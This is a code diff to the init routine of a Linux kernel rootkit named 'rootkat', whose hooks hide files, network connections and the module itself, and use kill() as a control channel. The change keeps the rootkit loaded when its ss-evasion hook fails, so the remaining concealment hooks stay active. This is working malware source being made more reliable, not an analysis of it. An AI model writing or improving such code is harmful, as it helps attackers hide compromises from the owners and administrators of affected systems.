@@ -65,16 +65,13 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
+	/* Non-fatal: this hook depends on a symbol that may be inlined or
+	 * renamed on some kernels. If it doesn't resolve, the ss(8) bypass
+	 * stays open, but every other hook still works. Log + continue. */
 	rc = rootkat_hook_inet_sk_diag_fill_install();
-	if (rc) {
-		pr_err(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d\n", rc);
-		rootkat_hook_tcp6_seq_show_remove();
-		rootkat_hook_tcp4_seq_show_remove();
-		rootkat_hook_filldir64_remove();
-		rootkat_hook_sys_kill_remove();
-		rootkat_hook_m_show_remove();
-		return rc;
-	}
+	if (rc)
+		pr_warn(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d (ss bypass not closed)\n",
+		        rc);
 
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
